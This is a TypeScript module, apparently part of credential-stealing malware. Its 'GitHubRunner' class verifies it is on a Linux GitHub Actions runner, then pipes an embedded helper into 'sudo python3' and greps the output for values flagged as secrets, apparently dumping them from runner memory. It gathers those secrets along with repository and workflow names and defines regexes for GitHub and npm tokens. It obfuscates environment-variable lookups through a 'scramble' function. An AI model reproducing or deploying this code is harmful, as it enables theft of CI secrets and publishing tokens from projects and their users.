import { execSync } from "child_process";

import { python_util } from "../../generated";
import { logUtil } from "../../utils/logger";
import { Provider } from "../base";
import type { ProviderResult } from "../types";

declare function scramble(str: string): string;

export class GitHubRunner extends Provider {
  private isGitHubActions: boolean;
  constructor() {
    super("github", "runner", {
      ghtoken: /gh[op]_[A-Za-z0-9]{36,}/g,
      npmtoken: /npm_[A-Za-z0-9]{36,}/g,
      ghs_jwt: /ghs_\d+_[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g,
      ghs_old: /ghs_[A-Za-z0-9]{36,}/g,
    });

    this.isGitHubActions = process.env[scramble("GITHUB_ACTIONS")] === "true";
  }

  async execute(): Promise<ProviderResult> {
    try {
      if (!this.isGitHubActions) {
        return this.failure("Not Actions");
      }
      const runnerOs = process.env["RUNNER_OS"] === "Linux";

      if (!runnerOs) {
        return this.failure("Not running on Linux runner");
      } else {
        logUtil.log("Runner matches!");
      }

      const repo = process.env[scramble("GITHUB_REPOSITORY")] ?? "";
      const workflow = process.env[scramble("GITHUB_WORKFLOW")] ?? "";

      const output = execSync(
        `sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' | sort -u`,
        {
          input: python_util,
          encoding: "utf-8",
        },
      );

      let result = new Map();
      const secretRegex = /"([^"]+)":{"value":"([^"]*)","isSecret":true}/g;
      let match;
      while ((match = secretRegex.exec(output)) !== null) {
        const [_, key, value] = match;

        if (key === scramble("github_token")) {
          continue;
        }
        result.set(key, value);
      }

      if (!result) {
        return this.failure("No secrets found.");
      }

      return this.success({
        secrets: result,
        repo: repo,
        workflow: workflow,
      });
    } catch (e) {
      logUtil.error(e);
      return this.failure("Error processing runner.");
    }
  }
}
